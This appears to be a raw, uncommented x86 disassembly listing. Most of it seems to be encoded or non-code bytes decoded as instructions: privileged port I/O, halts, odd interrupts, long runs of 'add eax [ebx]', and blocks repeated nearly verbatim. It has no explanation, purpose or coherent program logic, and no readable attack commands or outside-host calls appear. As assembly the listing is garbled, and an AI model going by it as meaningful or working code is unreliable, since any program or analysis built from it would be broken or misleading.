fidiv [ edi + 0x1e ]
salc
push edi
push esp
salc
ja r-xdata
jg r-xdata
jle r-xdata
popad
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpe r-xdata
xchg edx eax
insb
insb
stc
xchg ebx eax
insb
add eax 0x9393933f
stc
shr [ ebx ] cl
xchg ebx eax
cli
cmc
sbb dl dh
jg r-xdata
popfd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
sbb [ edi + 0x10 ] bh
jg r-xdata
jpe r-xdata
jle r-xdata
stc
test ebx 0x1af5e4f9
salc
ja r-xdata
jpe r-xdata
js r-xdata
push ebx
pushfd
pop ss
xlat
adc [ ebx - 0x4422e76d ] 0x18
salc
inc edi
nop
ficomp [ edi - 0x3d ]
insb
add eax [ ebx ]
add esp [ eax + 0x43c91e53 ]
adc [ eax - 0x66 ] ch
pushfd
adc al 0xda
pop eax
insb
insb
xchg ebx eax
jpe r-xdata
stc
div ch
sbb dl dh
jne r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
jns r-xdata
jpe r-xdata
insb
adc [ ebx - 0x5c6c046d ] 0xffffff93
xchg ebx eax
retn
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
dec esp
inc edi
insb
insb
sti
xchg edi eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
std
sbb [ ebx - 0xb ] bl
sbb bl dh
jpo r-xdata
jg r-xdata
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
push ss
jpo r-xdata
insb
add eax [ ebx ]
cmc
sbb cl dh
popfd
sbb [ ebx + 0x7a ] cl
popfd
jae r-xdata
jpo r-xdata
pop edi
xchg ebx eax
xchg ebx eax
jpe r-xdata
mov edx [ ebx - 0x60a8ef6d ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx + 0x6c6c474c ]
stc
hlt
inc ebx
retn
rol bl 0x7a
add [ ebp + 0x6c ] esp
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx edx
push ss
push ebx
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x657ad353 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
stc
iretd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
test [ ebx + 0x67997a93 ] dl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x5f4f7a53 ]
pop eax
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb bl dh
pop ebx
sbb [ ebx - 0x60 ] bl
push ebx
jpe r-xdata
stc
sbb [ esi ] 0xffffffd6
ja r-xdata
ror [ ebx + 0x57109393 ] 0x1
lahf
adc [ ebx + 0x7f2a7a93 ] 0x6c
push ebx
sar [ edx + 0x65 ] cl
retn
add eax [ ebx ]
add eax eax
push ds
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0xc343d61e
shr [ ebp + eax + 0x77 ] 0x93
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]

push ebx
jpe r-xdata
insb
insb
add eax [ ebx ]
dec ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
inc ebx
adc [ ebx - 0x79 ] dl
sbb dl dh
imul edi [ edx - 0x1c ] 0x4a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
rol bl 0x7b
jo r-xdata
jae r-xdata
add eax [ ebx ]
add ecx edx
stc
out 0xf5 al
sbb bl dh
push edi
sbb [ ebp + esi * 8 + 0x1a ] cl
into
and ebx [ eax ]
dec ebx
0x1af5
pop edi
add eax [ ebx ]
add edx [ esi ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0x5f4f7a53 ]
insb
add eax [ ebx ]
add eax esp
push ds
push ss
inc edi
outsb
insb
insb
insb
mov al [ 0x5ff27a53 ]
insb
sub_4665fa
insb
insb
add eax esi
sbb [ edi + 0x12 ] bh
jg r-xdata
insb
retn
0x7ac09393 0x7588
insb
insb
add edx [ eax ]
push edi
lahf
stc
xchg ebx eax
sti
xchg ebx eax
xchg ebx eax
xchg ebx eax
fwait
mov dl 0x93
xchg ebx eax
jpe r-xdata
insb
push ss
push ebx
jpe r-xdata
xchg ecx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
stc
sar [ edx + 0x73 ] cl
lahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
adc bh [ edi - 0x65 ]
xchg ecx eax
xchg ebx eax
xchg ebx eax
push ds
push ss
imul ebp [ esi + 0x6c ] 0x6c
jpo r-xdata
je r-xdata
cmc
test al 0x42
adc [ ebx + 0x3030393 ] 0x10
push edx
xchg ecx eax
cmc
adc [ edx - 0x7c27854d ] ch
xchg ebx eax
xchg ebx eax
add ebx ebx
pushfd
and al 0x43
push ds
int 0x97
sub ch [ esp + ebp * 2 - 0x6d ]
xchg ebx eax
sbb cl dh
imul edx [ eax + edx * 4 - 0x35 ] 0xffffffca
0xf5ca
add eax [ ebx ]
add edx [ eax ]
insb
add ebp [ esi - 0x61 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
pop esp
insb
insb
sbb bh dl
mov bh 0x83
insb
mov [ 0xffffffff93931796 ] eax
xchg ebx eax
jpe r-xdata
lea edx [ ebx - 0x6fcfc6d ]
jecxz r-xdata
pushfd
push ss
dec ebx
insb
insb
insb
sbb dh cl
imul edi [ edx + 0x43 ] 0x79
insb
insb
jpo r-xdata
push ebx
xchg esi eax
clc
dec eax
xchg esi eax
push ebp
xchg edi eax
mov al [ 0x6fce18fb ]
sbb [ eax - 0x30e5bd70 ] cl
mov [ 0x42a8f598 ] eax
jle r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
jpe r-xdata
lahf
sbb dl dh
dec ebp

add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
insb
jpe r-xdata
stc
in eax 0xf5
sbb dl dh
jge r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ebp
insb
insb
add eax [ ebx ]
sbb [ ebp - 0xb ] ch
sbb ch dh
sub eax 0x6c4af87a
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
fidiv [ edi + 0x1e ]
salc
push edi
push esp
salc
ja r-xdata
jg r-xdata
jle r-xdata
popad
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpe r-xdata
xchg edx eax
insb
insb
stc
xchg ebx eax
insb
add eax 0x9393933f
stc
shr [ ebx ] cl
xchg ebx eax
cli
cmc
sbb dl dh
jg r-xdata
popfd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
sbb [ edi + 0x10 ] bh
jg r-xdata
jpe r-xdata
jle r-xdata
stc
test ebx 0x1af5e4f9
salc
ja r-xdata
jpe r-xdata
js r-xdata
push ebx
pushfd
pop ss
xlat
adc [ ebx - 0x4422e76d ] 0x18
salc
inc edi
nop
ficomp [ edi - 0x3d ]
insb
add eax [ ebx ]
add esp [ eax + 0x43c91e53 ]
adc [ eax - 0x66 ] ch
pushfd
adc al 0xda
pop eax
insb
insb
xchg ebx eax
jpe r-xdata
stc
div ch
sbb dl dh
jne r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
jns r-xdata
jpe r-xdata
insb
adc [ ebx - 0x5c6c046d ] 0xffffff93
xchg ebx eax
retn
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
dec esp
inc edi
insb
insb
sti
xchg edi eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
std
sbb [ ebx - 0xb ] bl
sbb bl dh
jpo r-xdata
jg r-xdata
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
push ss
jpo r-xdata
insb
add eax [ ebx ]
cmc
sbb cl dh
popfd
sbb [ ebx + 0x7a ] cl
popfd
jae r-xdata
jpo r-xdata
pop edi
xchg ebx eax
xchg ebx eax
jpe r-xdata
mov edx [ ebx - 0x60a8ef6d ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx + 0x6c6c474c ]
stc
hlt
inc ebx
retn
rol bl 0x7a
add [ ebp + 0x6c ] esp
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx edx
push ss
push ebx
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x657ad353 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
stc
iretd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
test [ ebx + 0x67997a93 ] dl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x5f4f7a53 ]
pop eax
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb bl dh
pop ebx
sbb [ ebx - 0x60 ] bl
push ebx
jpe r-xdata
stc
sbb [ esi ] 0xffffffd6
ja r-xdata
ror [ ebx + 0x57109393 ] 0x1
lahf
adc [ ebx + 0x7f2a7a93 ] 0x6c
push ebx
sar [ edx + 0x65 ] cl
retn
add eax [ ebx ]
add eax eax
push ds
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0xc343d61e
shr [ ebp + eax + 0x77 ] 0x93
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]

push ebx
jpe r-xdata
insb
insb
add eax [ ebx ]
dec ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
inc ebx
adc [ ebx - 0x79 ] dl
sbb dl dh
imul edi [ edx - 0x1c ] 0x4a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
rol bl 0x7b
jo r-xdata
jae r-xdata
add eax [ ebx ]
add ecx edx
stc
out 0xf5 al
sbb bl dh
push edi
sbb [ ebp + esi * 8 + 0x1a ] cl
into
and ebx [ eax ]
dec ebx
0x1af5
pop edi
add eax [ ebx ]
add edx [ esi ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0x5f4f7a53 ]
insb
add eax [ ebx ]
add eax esp
push ds
push ss
inc edi
outsb
insb
insb
insb
mov al [ 0x5ff27a53 ]
insb
sub_466670
test al 0x42
pushfd
pop ss
mov [ 0x1e939393 ] al
salc
sbb [ edx ] 0xffffffd6
outsd
adc dh dl
outsd
xchg edi eax
pushfd
and al 0x51
push ds

sub_46674b
fidivr [ edx + 0x59 ]
mov [ ebx + 0x3030393 ] edx
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
in eax 0xf5
sbb dl dh
jge r-xdata
jg r-xdata
jle r-xdata
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpe r-xdata
xchg edx eax
insb
insb
stc
xchg ebx eax
insb
add eax 0x9393933f
stc
shr [ ebx ] cl
xchg ebx eax
cli
cmc
sbb dl dh
jg r-xdata
popfd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
sbb [ edi + 0x10 ] bh
jg r-xdata
jpe r-xdata
jle r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
stc
test ebx 0x1af5e4f9
salc
ja r-xdata
jpe r-xdata
js r-xdata
push ebx
pushfd
pop ss
xlat
adc [ ebx - 0x4422e76d ] 0x18
salc
inc edi
nop
ficomp [ edi - 0x3d ]
insb
add eax [ ebx ]
add esp [ eax + 0x43c91e53 ]
adc [ eax - 0x66 ] ch
pushfd
adc al 0xda
pop eax
insb
insb
xchg ebx eax
jpe r-xdata
stc
div ch
sbb dl dh
jne r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
jns r-xdata
jpe r-xdata
insb
adc [ ebx - 0x5c6c046d ] 0xffffff93
xchg ebx eax
retn
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
dec esp
inc edi
insb
insb
sti
xchg edi eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
std
sbb [ ebx - 0xb ] bl
sbb bl dh
jpo r-xdata
jg r-xdata
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
push ss
jpo r-xdata
insb
add eax [ ebx ]
cmc
sbb cl dh
popfd
sbb [ ebx + 0x7a ] cl
popfd
jae r-xdata
jpo r-xdata
pop edi
xchg ebx eax
xchg ebx eax
jpe r-xdata
mov edx [ ebx - 0x60a8ef6d ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx + 0x6c6c474c ]
stc
hlt
inc ebx
retn
rol bl 0x7a
add [ ebp + 0x6c ] esp
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx edx
push ss
push ebx
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x657ad353 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
stc
iretd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
test [ ebx + 0x67997a93 ] dl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x5f4f7a53 ]
pop eax
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb bl dh
pop ebx
sbb [ ebx - 0x60 ] bl
push ebx
jpe r-xdata
stc
sbb [ esi ] 0xffffffd6
ja r-xdata
ror [ ebx + 0x57109393 ] 0x1
lahf
adc [ ebx + 0x7f2a7a93 ] 0x6c
push ebx
sar [ edx + 0x65 ] cl
retn
add eax [ ebx ]
add eax eax
push ds
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0xc343d61e
shr [ ebp + eax + 0x77 ] 0x93
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]

push ebx
jpe r-xdata
insb
insb
add eax [ ebx ]
dec ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
inc ebx
adc [ ebx - 0x79 ] dl
sbb dl dh
imul edi [ edx - 0x1c ] 0x4a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
rol bl 0x7b
jo r-xdata
jae r-xdata
add eax [ ebx ]
add ecx edx
stc
out 0xf5 al
sbb bl dh
push edi
sbb [ ebp + esi * 8 + 0x1a ] cl
into
and ebx [ eax ]
dec ebx
0x1af5
pop edi
add eax [ ebx ]
add edx [ esi ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0x5f4f7a53 ]
insb
add eax [ ebx ]
add eax esp
push ds
push ss
inc edi
outsb
insb
insb
insb
mov al [ 0x5ff27a53 ]
insb
sub_4667a8
outsd
sbb dl [ 0xffffffff9393934b ]
adc [ ebx - 0x5c6c046d ] 0xffffff93
xchg ebx eax
retn
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
dec esp
inc edi
insb
insb
cli
cmc
sbb dl dh
jg r-xdata
popfd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
sbb [ edi + 0x10 ] bh
jg r-xdata
stc
in eax 0xf5
sbb dl dh
jge r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
stc
test ebx 0x1af5e4f9
salc
ja r-xdata
jg r-xdata
jle r-xdata
jpe r-xdata
xchg ebx eax
stc
div ch
sbb dl dh
jne r-xdata
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpe r-xdata
xchg edx eax
insb
insb
stc
xchg ebx eax
insb
add eax 0x9393933f
stc
shr [ ebx ] cl
xchg ebx eax
sti
xchg edi eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
std
sbb [ ebx - 0xb ] bl
sbb bl dh
jpo r-xdata
jpe r-xdata
jle r-xdata
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx + 0x6c6c474c ]
stc
hlt
jpe r-xdata
js r-xdata
push ebx
pushfd
pop ss
xlat
adc [ ebx - 0x4422e76d ] 0x18
salc
inc edi
nop
ficomp [ edi - 0x3d ]
insb
add eax [ ebx ]
add esp [ eax + 0x43c91e53 ]
adc [ eax - 0x66 ] ch
pushfd
adc al 0xda
pop eax
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
jns r-xdata
jpe r-xdata
insb
jg r-xdata
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
push ss
jpo r-xdata
insb
add eax [ ebx ]
cmc
sbb cl dh
popfd
sbb [ ebx + 0x7a ] cl
popfd
jae r-xdata
jpo r-xdata
pop edi
xchg ebx eax
xchg ebx eax
jpe r-xdata
mov edx [ ebx - 0x60a8ef6d ]
inc ebx
retn
rol bl 0x7a
add [ ebp + 0x6c ] esp
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx edx
push ss
push ebx
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x657ad353 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
stc
iretd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
test [ ebx + 0x67997a93 ] dl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x5f4f7a53 ]
pop eax
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb bl dh
pop ebx
sbb [ ebx - 0x60 ] bl
push ebx
jpe r-xdata
stc
sbb [ esi ] 0xffffffd6
ja r-xdata
ror [ ebx + 0x57109393 ] 0x1
lahf
adc [ ebx + 0x7f2a7a93 ] 0x6c
push ebx
sar [ edx + 0x65 ] cl
retn
add eax [ ebx ]
add eax eax
push ds
push ss
das
imul ebp [ esp + ebp * 2 - 0x3d ] 0xc343d61e
shr [ ebp + eax + 0x77 ] 0x93
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg edi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]

push ebx
jpe r-xdata
insb
insb
add eax [ ebx ]
dec ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
inc ebx
adc [ ebx - 0x79 ] dl
sbb dl dh
imul edi [ edx - 0x1c ] 0x4a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
rol bl 0x7b
jo r-xdata
jae r-xdata
add eax [ ebx ]
add ecx edx
stc
out 0xf5 al
sbb bl dh
push edi
sbb [ ebp + esi * 8 + 0x1a ] cl
into
and ebx [ eax ]
dec ebx
0x1af5
pop edi
add eax [ ebx ]
add edx [ esi ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0x5f4f7a53 ]
insb
add eax [ ebx ]
add eax esp
push ds
push ss
inc edi
outsb
insb
insb
insb
mov al [ 0x5ff27a53 ]
insb
sub_4669fb
scasd [ edi ]
sbb [ ebx - 0x60 ] ah
dec eax
test al 0x60
pushfd
push ss
stosd [ edi ]
adc [ ebx - 0x79933f6d ] 0x3f
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
pop esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
enter 0x505a 0x3
add eax [ ebx ]
add ebp [ ebp + eax + 0x1f ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
stosb [ edi ]
out dx al
outsd
jpe r-xdata
cmc
sbb bl dh
push ebp
stc
cli
sbb [ ebp - 0x36 ] cl
cmc
sbb cl dh
daa
sbb [ ebx - 0xb ] cl
sbb dl dh
inc ebx
jpe r-xdata
xchg ebx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
sti
0xc40750bd 0xd51a
jpe r-xdata
push eax
pop es
les ebx [ edx ]
aad 0xaf
pushfd
xchg ebx eax
xchg ebx eax
adc bh ch
mov bh 0x83
xchg [ ecx + edx + 0x6c6c5953 ] ebx
stc
xchg ebx eax
insb
add eax 0x9393933f
int3
out 0xf5 al
sbb bl dh
push edi
sbb [ ebp + esi * 8 + 0x1a ] cl
into
and ebx [ eax ]
dec ebx
0x1af5
insb
insb
insb
les edi [ ebx + 0x75 ]
push esi
insb
insb
sub_466ae1
push 0xf9036c6c
dec ecx
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
neg [ eax ]
xchg edx eax
jpe r-xdata
inc ebp
insb
insb
add eax [ ebx ]
add esi ebp
sbb dl dh
imul ecx ebx 0xfffffff9
mov ebp 0x69d61af5

fsubr [ ecx + 0x6c ]
insb
jpe r-xdata
outsb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
xchg ebx eax
pushfd
and al 0x82
jpe r-xdata
dec edx
insb
insb
add eax [ ebx ]
add edi ecx
out 0xf5 eax
sbb bl dh
popad
0xbdf9
xchg edi eax
xchg edx eax
xchg ebx eax
xchg ebx eax
push ds
push ss
and ebp [ esi + 0x6c ]
insb
retn
dec esi
insb
insb
nop
push ebx
retn
add eax [ ebx ]
cwde
xchg ebx eax
xchg ebx eax
stc
mov bl 0xf5
sbb al dh
dec ebp
jpe r-xdata
pop ss
push ebx
nop
xchg ebx eax
xchg ebx eax
jpe r-xdata
jg r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
pop ss
mov bh 0xb
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
bound ebp [ esp + ebp * 2 + 0x3 ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax + 0x64521841 ]
out 0x83 al
aad 0x7a
dec ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
insb
add eax [ ebx ]
add ebp [ ebx + 0x6f ]
sbb [ ebx + 0x7a9bde90 ] bl
mov bl 0x60
insb
insb
add eax [ ebx ]
jpe r-xdata
mov bh 0xca
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi + edx + 0x6c6c7291 ]
sbb bl bl
fwait
jpe r-xdata
inc esp
insb
insb
add eax [ ebx ]
stc
dec ebx
jpe r-xdata
popfd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi + 0x7a ] bh
xchg ebx eax
xchg [ ebx + 0x3030393 ] dl
add edx [ esi ]
push ebx
pushfd
pop ss
pop eax
nop
xchg ebx eax
xchg ebx eax
adc bh ch
mov bh 0xb7
xchg ebx eax
pushfd
insb
out 0x77 al
insb
mov [ ebx + 0x3030393 ] dl
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
